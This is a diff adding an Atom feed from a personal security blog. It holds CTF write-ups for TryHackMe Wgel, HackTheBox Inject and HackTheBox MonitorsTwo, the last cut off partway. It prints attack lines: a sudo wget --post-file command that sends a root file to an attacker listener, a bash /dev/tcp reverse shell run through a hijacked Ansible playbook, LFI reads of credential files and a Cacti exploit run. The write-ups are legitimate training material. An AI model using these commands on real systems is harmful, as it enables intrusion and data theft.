@@ -1,0 +1,1031 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/">
+    <title>bughunter.me</title>
+    <link href="https://e4ld3rs0n.github.io/bughunter-publii/feed.xml" rel="self" />
+    <link href="https://e4ld3rs0n.github.io/bughunter-publii" />
+    <updated>2025-01-26T18:12:13+01:00</updated>
+    <author>
+        <name>andrey</name>
+    </author>
+    <id>https://e4ld3rs0n.github.io/bughunter-publii</id>
+
+    <entry>
+        <title>TryHackMe: Wgel write-up</title>
+        <author>
+            <name>andrey</name>
+        </author>
+        <link href="https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-wgel-write-up/"/>
+        <id>https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-wgel-write-up/</id>
+        <media:content url="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/20/Wgel-Banner-jpg.webp" medium="image" />
+            <category term="tryhackme"/>
+            <category term="ctf"/>
+
+        <updated>2024-02-11T22:46:55+01:00</updated>
+            <summary>
+                <![CDATA[
+                        <img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/20/Wgel-Banner-jpg.webp" alt="" />
+                    In this article we'll tackle an easy CTF on TryHackMe. We'll enumerate a Linux box, find misplaced credentials and exploit a common Linux tool to&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                    <p><img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/20/Wgel-Banner-jpg.webp" class="type:primaryImage" alt="" /></p>
+                <p><!-- wp:paragraph --></p>
+<p>In this article we'll tackle an easy CTF on TryHackMe. We'll enumerate a Linux box, find misplaced credentials and exploit a common Linux tool to escalate our privileges and exfiltrate information.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Link: <a href="https://tryhackme.com/room/wgelctf" target="_blank" rel="noopener" title="">https://tryhackme.com/room/wgelctf</a></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Difficulty: <code>Easy</code></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Authors: <code>MrSeth6797</code></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:heading --></p>
+<h2 class="wp-block-heading">First steps and enumeration</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>Our journey into this CTF challenge begins with a comprehensive <code>nmap</code> scan to identify active services on the target machine. The scan revealed two open ports: an HTTP server on port 80 and SSH on port 22, indicating potential targets for exploration. The HTTP server is running Apache httpd 2.4.18 on Ubuntu, while the SSH service is OpenSSH 7.2p2 Ubuntu 4ubuntu2.8.:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock {"language":"bash"} --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ nmap -sV -sT -p- -oN nmap/full-scan.nmap $IPStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-15 15:18 CETNmap scan report for 10.10.222.165Host is up (0.042s latency).Not shown: 65533 closed tcp ports (conn-refused)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 26.88 seconds</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>It looks like the web server hosts the default web page bundled with Apache installation. However a quick GoBuster scan with the <code>directory-list-lowercase-2.3-medium.txt</code> list shows that there is something more than meets the eye:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt | tee gobuster.log===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.10.222.165[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.6[+] Timeout:                 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/sitemap              (Status: 301) [Size: 316] [--&gt; http://10.10.222.165/sitemap/]Progress: 62904 / 207644 (30.29%)</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>There's a hidden /sitemap directory. An inspection of the website's source code also revealed a comment potentially hinting at a username:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock {"language":"html"} --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="html" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;!-- Jessie don’t forget to udate the website. --&gt;</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>The detail noted appears to be a potential username, which could be important later on. Next, we visited the <code>/sitemap</code> area of the website.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>It's a template from ColorLib, but nothing stood out at first. To dig deeper, I used <code>GoBuster</code> for a directory search. When the initial scan with one wordlist didn't show results, I switched to the DirBuster wordlist for a more thorough search:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ gobuster dir -u http://$IP/sitemap -w /usr/share/wordlists/dirb/common.txt | tee gobuster-sitemap.log ===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.10.222.165/sitemap[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/wordlists/dirb/common.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.6[+] Timeout:                 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/.hta                 (Status: 403) [Size: 278]/.htaccess            (Status: 403) [Size: 278]/.htpasswd            (Status: 403) [Size: 278]/.ssh                 (Status: 301) [Size: 321] [--&gt; http://10.10.222.165/sitemap/.ssh/]/css                  (Status: 301) [Size: 320] [--&gt; http://10.10.222.165/sitemap/css/]/fonts                (Status: 301) [Size: 322] [--&gt; http://10.10.222.165/sitemap/fonts/]/images               (Status: 301) [Size: 323] [--&gt; http://10.10.222.165/sitemap/images/]/index.html           (Status: 200) [Size: 21080]/js                   (Status: 301) [Size: 319] [--&gt; http://10.10.222.165/sitemap/js/]Progress: 4614 / 4615 (99.98%)===============================================================Finished===============================================================</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>There is a very interesting hidden directory called .ssh. If we take a peek inside we find an SSH private key. We can make a handy backup copy of it on our machine and use it with the username <code>jessie</code> to access the target box. Inside Jessie's Documents directory we can finally get the user flag.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:heading --></p>
+<h2 class="wp-block-heading">Privilege escalation</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>After gaining access to the system, we proceeded to further enumerate its configuration. A quick check with <code>sudo -l</code> revealed a particularly interesting privilege assigned to the user <code>jessie</code>. The system allows <code>jessie</code> to execute <code>wget</code> as root without the need for a password:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock {"language":"bash"} --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ sudo -lMatching Defaults entries for jessie on CorpOne:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser jessie may run the following commands on CorpOne:    (ALL : ALL) ALL    (root) NOPASSWD: /usr/bin/wget</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>Since we can't see what's inside the <code>/root</code> directory, but guessing that the root flag might be called <code>root_flag.txt</code> (just like the user flag was named <code>user_flag.txt</code>), we can use <code>wget</code> to try and grab it.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>First, let's set up a listener on our local machine to receive the file. This can be done using <code>netcat</code>:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock {"language":"bash"} --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ nc -vlnp 1337</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>Now let's use <code>wget</code> to send the contents of the <code>root_flag.txt</code> file from the target system to our listener:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock {"language":"bash"} --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ sudo wget --post-file=/root/root_flag.txt http://&lt;Attacker IP&gt;:1337</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>And just like that, we capture the root flag right in our terminal.</p>
+<p><!-- /wp:paragraph --></p>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>HackTheBox: Inject write-up</title>
+        <author>
+            <name>andrey</name>
+        </author>
+        <link href="https://e4ld3rs0n.github.io/bughunter-publii/hackthebox-inject-write-up/"/>
+        <id>https://e4ld3rs0n.github.io/bughunter-publii/hackthebox-inject-write-up/</id>
+        <media:content url="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/Inject.png" medium="image" />
+            <category term="hackthebox"/>
+            <category term="ctf"/>
+
+        <updated>2023-05-29T20:01:47+02:00</updated>
+            <summary>
+                <![CDATA[
+                        <img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/Inject.png" alt="" />
+                    In this post we'll take a look at the solution to the Inject challenge on HackTheBox. The solution involves abusing an LFI vulnerability and exploiting&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                    <p><img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/Inject.png" class="type:primaryImage" alt="" /></p>
+                <p><!-- wp:paragraph --></p>
+<p>In this post we'll take a look at the solution to the Inject challenge on HackTheBox. The solution involves abusing an LFI vulnerability and exploiting a misconfigured service to obtain root privileges. The difficulty for this challenge is <code>Easy</code>.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:heading --></p>
+<h2 class="wp-block-heading">Enumeration</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>We start the challenge by scanning the machine with Rustscan. We have two services running: SSH on the standard port 22 and a web server on port 8080. We also learn that we are dealing with an Ubuntu server. Since we don't have any credentials yet let's take a look at the web application.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>After poking around we find that the application offers an image upload service. There is a file filter which rejects non-image files based on the file extension. Although the filter is very easy to bypass by changing the file extension, I did not find any obvious way to exploit it and get a reverse shell.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>I noticed that after a successful upload the image is available by visiting the URL <code>/show_image?img=imagename.jpg</code> where the file name is passed as a parameter. This parameter might be abused to include any file that is locally present on the machine. To test this I tried to display the debian logo (which should be present on the machine as it is running Ubuntu) found by default in <code>/usr/share/pixmaps/debian-logo.png</code>:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:image {"id":284,"sizeSlug":"large","linkDestination":"none"} --></p>
+<figure class="wp-block-image size-large"><figure class="wp-image-284"><img loading="lazy"  src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/01.local_file_inclusion-1024x609.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/01.local_file_inclusion-1024x609-xs.png 300w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/01.local_file_inclusion-1024x609-sm.png 480w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/01.local_file_inclusion-1024x609-md.png 768w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/01.local_file_inclusion-1024x609-lg.png 1024w"></figure></figure>
+<p><!-- /wp:image --></p>
+<p><!-- wp:paragraph --></p>
+<p>Nice, we can take a look at the local filesystem. Let's open this request in Burp Suite Repeater and see if we can access the <code>/etc/passwd</code> file. Surprise, surprise - we can:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:image {"id":287,"sizeSlug":"full","linkDestination":"none"} --></p>
+<figure class="wp-block-image size-full"><figure class="wp-image-287"><img loading="lazy"  src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/02.burpsuite.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/02.burpsuite-xs.png 300w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/02.burpsuite-sm.png 480w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/02.burpsuite-md.png 768w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/02.burpsuite-lg.png 1024w"></figure></figure>
+<p><!-- /wp:image --></p>
+<p><!-- wp:paragraph --></p>
+<p>I found that the same 'img' parameter could be used to get a listing if I specified a directory. Very conveniently we can also see all the hidden directories in this way. Taking this route, I "navigated" to the '/home' directory which yielded a list of users on the machine, specifically two users named <code>phil</code> and <code>frank</code>. Inside <code>frank</code>'s home directory I also noticed an interesting file in <code>/home/frank/.m2/settings.xml</code> which contained some credentials:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock {"language":"xml"} --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="xml" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;  &lt;servers&gt;    &lt;server&gt;      &lt;id&gt;Inject&lt;/id&gt;      &lt;username&gt;phil&lt;/username&gt;      &lt;password&gt;[REDACTED PASSWORD]&lt;/password&gt;      &lt;privateKey&gt;${user.home}/.ssh/id_dsa&lt;/privateKey&gt;      &lt;filePermissions&gt;660&lt;/filePermissions&gt;      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;      &lt;configuration&gt;&lt;/configuration&gt;    &lt;/server&gt;  &lt;/servers&gt;&lt;/settings&gt;</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>Trying to use these credentials to get an SSH session did not work. As I explored more I stumbled upon <code>/var/www/WebApp/pom.xml</code> which contained more valuable information:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock {"language":"xml"} --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="xml" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">...&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt;&lt;version&gt;3.2.2&lt;/version&gt;&lt;/dependency&gt;...</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:heading --></p>
+<h2 class="wp-block-heading">Initial foothold and user flag</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>It looks like an outdated and potentially vulnerable version of the Spring Cloud Framework is in use (more information <a href="https://spring.io/security/cve-2022-22963" target="_blank" rel="noopener" title="">here</a>). We can abuse it to gain a remote shell with Metasploit, using the module <code>multi/http/spring_cloud_function_spel_injection</code>:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:image {"id":288,"sizeSlug":"full","linkDestination":"none"} --></p>
+<figure class="wp-block-image size-full"><figure class="wp-image-288"><img loading="lazy"  src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/03.metasploit.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/03.metasploit-xs.png 300w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/03.metasploit-sm.png 480w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/03.metasploit-md.png 768w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/03.metasploit-lg.png 1024w"></figure></figure>
+<p><!-- /wp:image --></p>
+<p><!-- wp:paragraph --></p>
+<p>We got access to the machine as <code>frank</code>. I proceeded to scan the machine with Linpeas which suggested that the machine might be vulnerable to CVE-2021-3560 and CVE-2022-2588. Unfortunately that was not really the case.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>I started pspy next which revealed some interesting information:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:image {"id":290,"sizeSlug":"large","linkDestination":"none"} --></p>
+<figure class="wp-block-image size-large"><figure class="wp-image-290"><img loading="lazy"  src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/04.pspy_-1024x530.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/04.pspy_-1024x530-xs.png 300w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/04.pspy_-1024x530-sm.png 480w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/04.pspy_-1024x530-md.png 768w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/04.pspy_-1024x530-lg.png 1024w"></figure></figure>
+<p><!-- /wp:image --></p>
+<p><!-- wp:paragraph --></p>
+<p>It looks like Ansible Playbooks is running on the machine and executes the <code>playbook_1.yml</code> playbook found in the <code>/opt/automation</code> directory. This looks interesting, let's investigate further:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">ls -alh /opt/automation	total 12Kdrwxr-xr-x 3 root root  4.0K Oct 20  2022 .drwxr-xr-x 3 root root  4.0K Oct 20  2022 ..drwxrwxr-x 2 root staff 4.0K May 29 19:08 tasksls -alh /opt/automation/taskstotal 12Kdrwxrwxr-x 2 root staff 4.0K May 29 19:10 .drwxr-xr-x 3 root root  4.0K Oct 20  2022 ..-rw-r--r-- 1 root root   150 May 29 19:10 playbook_1.yml</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>Currently we don't have write permissions to mess with the playbook file. Remember the credentials we found earlier? Turns out we can become <code>phil</code> (and get the user flag!). Also notice that <code>phil</code> is in the <code>staff</code> group:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">id philuid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:heading {"level":1} --></p>
+<h1 class="wp-block-heading">Root flag</h1>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>As <code>phil</code> we can't directly edit the <code>playbook_1.yml</code> file however nothing is there to stop us from deleting it and creating our own customized version of it.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>For example we can get a reverse root shell on the box. To do so let's first create a reverse shell script on our local machine with the following content:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock {"language":"bash"} --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">/bin/bash -i &gt;&amp; /dev/tcp/[OUR IP]/[PORT] 0&gt;&amp;1</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>We will also need a custom version of <code>playbook_1.yml</code> file:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">- hosts: localhost  tasks:  - name: Pwn the box    command: sudo bash /tmp/revshell.sh</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>We can upload both files to the target box, move the bash script to <code>/tmp/revshell.sh</code> and <code>playbook_1.yml</code> to <code>/opt/automation/tasks</code> (remembering to delete the original playbook file and adding the execution permission to the shell script with <code>chmod</code>).</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>All that's left to do is to open a netcat listener on our box and get the root flag.</p>
+<p><!-- /wp:paragraph --></p>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>HackTheBox: MonitorsTwo write-up</title>
+        <author>
+            <name>andrey</name>
+        </author>
+        <link href="https://e4ld3rs0n.github.io/bughunter-publii/hackthebox-monitorstwo-write-up/"/>
+        <id>https://e4ld3rs0n.github.io/bughunter-publii/hackthebox-monitorstwo-write-up/</id>
+        <media:content url="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/MonitorsTwo.png" medium="image" />
+            <category term="hackthebox"/>
+            <category term="ctf"/>
+
+        <updated>2023-05-11T11:52:03+02:00</updated>
+            <summary>
+                <![CDATA[
+                        <img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/MonitorsTwo.png" alt="" />
+                    In this article we'll crack the MonitorsTwo machine on HackTheBox. The solution involves exploiting an outdated version of Cacti (a server monitoring software), accessing a&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                    <p><img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/MonitorsTwo.png" class="type:primaryImage" alt="" /></p>
+                <p><!-- wp:paragraph --></p>
+<p>In this article we'll crack the MonitorsTwo machine on HackTheBox. The solution involves exploiting an outdated version of Cacti (a server monitoring software), accessing a poorly protected MySQL database, cracking password hashes and abusing Docker permissions. This challenge is rated as <code>easy</code> on HackTheBox.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:heading --></p>
+<h2 class="wp-block-heading">Enumeration and initial access</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>As usual, we begin our enumeration process with a port scan. We find out that two services are present, SSH and HTTP, both running on standard ports:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code>PORT   STATE SERVICE REASON  VERSION22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)...80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-favicon: Unknown favicon MD5: 4F12CCCD3C42A4A478F067337FE92794|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Login to CactiService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>As indicated by the web service scan results, upon accessing the web page, we encounter a Cacti 1.2.22 login page. Cacti is an open-source, web-based network monitoring and graphing solution that offers a user-friendly interface for managing and visualizing network performance data, usually in the form of graphs and charts.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Upon investigating the specific version of Cacti in use, we find that it is vulnerable to CVE-2022-4612269. This vulnerability enables an unauthenticated attacker to execute arbitrary code on the server hosting Cacti. To exploit this weakness, we turn to GitHub, where we discover one of the many <a href="https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22/blob/main/CVE-2022-46169.py" target="_blank" rel="noopener" title="">working exploits</a>.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>To get a shell on the target all we have to do is open a netcat listener on our machine with <code>rlwrap nc -vlnp 9001</code> and execute the exploit:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code>$ python3 exploit.py -u http://&lt;TARGET IP&gt;/ --LHOST &lt;LOCAL IP&gt; --LPORT 9001 Checking...The target is vulnerable. Exploiting...Bruteforcing the host_id and local_data_idsBruteforce Success!!</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>After getting the shell, we can stabilize it with the following commands:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code>$ export TERM=xterm# Background the session with CTRL+Z$ stty raw -echo; fg;</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:heading --></p>
+<h2 class="wp-block-heading">Machine enumeration and user flag</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>Upon gaining access to the machine, we immediately notice the presence of a <code>/.dockerenv</code> file which indicates that we are inside a Docker container. We also come across a file named <code>/entrypoint.sh</code>. This file typically serves as the entry point for a Docker container, containing instructions and commands that are executed when the container starts:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:image {"id":255,"sizeSlug":"full","linkDestination":"none"} --></p>
+<figure class="wp-block-image size-full"><figure class="wp-image-255"><img loading="lazy"  src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/monitortwo-docker-container.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-docker-container-xs.png 300w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-docker-container-sm.png 480w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-docker-container-md.png 768w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-docker-container-lg.png 1024w"></figure></figure>
+<p><!-- /wp:image --></p>
+<p><!-- wp:paragraph --></p>
+<p>Let's take a look at <code>entrypoint.sh</code>:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock {"language":"bash"} --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">bash-5.1$ cat entrypoint.shcat entrypoint.sh#!/bin/bashset -exwait-for-it db:3306 -t 300 -- echo "database is connected"if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then    mysql --host=db --user=root --password=root cacti &lt; /var/www/html/cacti.sql    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"fichown www-data:www-data -R /var/www/html# first arg is `-f` or `--some-option`if [ "${1#-}" != "$1" ]; then	set -- apache2-foreground "$@"fiexec "$@"</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>We have the credentials for the MySQL database! Let's connect to it and take a look:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock {"language":"mariadb"} --></p>
